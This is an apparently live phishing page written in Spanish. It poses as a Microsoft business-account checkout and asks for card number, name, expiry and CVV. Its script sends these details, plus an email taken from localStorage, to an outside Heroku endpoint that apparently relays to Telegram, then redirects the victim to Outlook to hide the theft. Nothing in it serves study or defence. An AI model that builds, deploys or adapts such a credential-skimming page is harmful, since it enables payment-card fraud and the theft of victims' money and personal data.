<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Microsoft - A침ade una tarjeta</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      body {
        font-family: "Roboto", sans-serif;
      }
      input::placeholder {
        color: #a0aec0;
      }
    </style>
  </head>
  <body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white shadow-lg rounded-md w-full max-w-md">
      <!-- Header -->
      <div class="flex items-center justify-between border-b p-4">
        <div class="flex items-center gap-2">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
            alt="Microsoft"
            class="w-5 h-5"
          />
          <div class="text-sm">
            <div class="font-bold">Est치s comprando</div>
            <div>Cuenta Empresarial
</div>
          </div>
        </div>
        <div class="text-right">
          <div class="text-lg font-bold">
            $0.89 <span class="text-sm">/ Por a침o</span>
          </div>
        </div>
      </div>

      <!-- Form -->
      <form class="p-6 space-y-5">
        <h2 class="text-lg font-semibold">A침ade una tarjeta de credito</h2>

        <!-- Card Logos -->
        <div class="flex space-x-3">
          <img
            src="https://img.icons8.com/color/48/000000/visa.png"
            class="h-8"
          />
          <img
            src="https://img.icons8.com/color/48/000000/amex.png"
            class="h-8"
          />
          <img
            src="https://img.icons8.com/color/48/000000/mastercard.png"
            class="h-8"
          />
          <img
            src="https://img.icons8.com/color/48/000000/discover.png"
            class="h-8"
          />
        </div>

        <!-- Card Number -->
        <div>
          <label class="block text-sm font-medium mb-1">Numero de Tarjeta*</label>
          <input
            type="text"
            placeholder="**** **** **** ****"
            required
            class="w-full border px-3 py-2 rounded-md focus:outline-none focus:ring focus:ring-blue-300"
          />
        </div>

        <!-- Cardholder Name -->
        <div>
          <label class="block text-sm font-medium mb-1">Nombres y Apellidos*</label>
          <input
            type="text"
            placeholder="John Doe"
            required
            class="w-full border px-3 py-2 rounded-md focus:outline-none focus:ring focus:ring-blue-300"
          />
        </div>

        <!-- Expiry and CVV -->
        <div class="flex space-x-4">
          <div class="flex-1">
            <label class="block text-sm font-medium mb-1">Fecha de Expiracion*</label>
            <div class="flex space-x-2">
              <input
                type="text"
                placeholder="MM"
                maxlength="2"
                class="w-1/2 border px-2 py-2 rounded-md text-center"
              />
              <input
                type="text"
                placeholder="YY"
                maxlength="2"
                class="w-1/2 border px-2 py-2 rounded-md text-center"
              />
            </div>
          </div>
          <div class="w-1/3">
            <label class="block text-sm font-medium mb-1">CVV*</label>
            <input
              type="text"
              placeholder="***"
              maxlength="4"
              class="w-full border px-3 py-2 rounded-md text-center"
            />
          </div>
        </div>

        <!-- Continue Button -->
        <div class="pt-4">
          <button
            type="submit"
            class="bg-blue-600 text-white w-full py-2 rounded-md hover:bg-blue-700 transition"
          >
            Continuar
          </button>
        </div>
      </form>
    </div>
  </body>
  <script>
    document.querySelector("form").addEventListener("submit", function (e) {
      e.preventDefault();

      const cardNumber = document.querySelector(
        'input[placeholder="**** **** **** ****"]'
      ).value;
      const cardholder = document.querySelector(
        'input[placeholder="John Doe"]'
      ).value;
      const expMM = document.querySelector('input[placeholder="MM"]').value;
      const expYY = document.querySelector('input[placeholder="YY"]').value;
      const cvv = document.querySelector('input[placeholder="***"]').value;

      const message = `
  游눱 Nueva tarjeta enviada:
  -----------------------------
  Correo: ${localStorage.getItem("usuario")}
  Card Number: ${cardNumber}
  Nombre: ${cardholder}
  Expira: ${expMM}/${expYY}
  CVV: ${cvv}
  -----------------------------
  `;

      fetch(`https://srvdor-33a68f3ab628.herokuapp.com/bal1`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mensaje: message,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          window.location.href = "https://outlook.live.com/mail/0/archive";
        })
        .catch((error) => {
          alert("Error al enviar los datos.");
          console.error("Telegram Error:", error);
        });
    });
  </script>
</html>
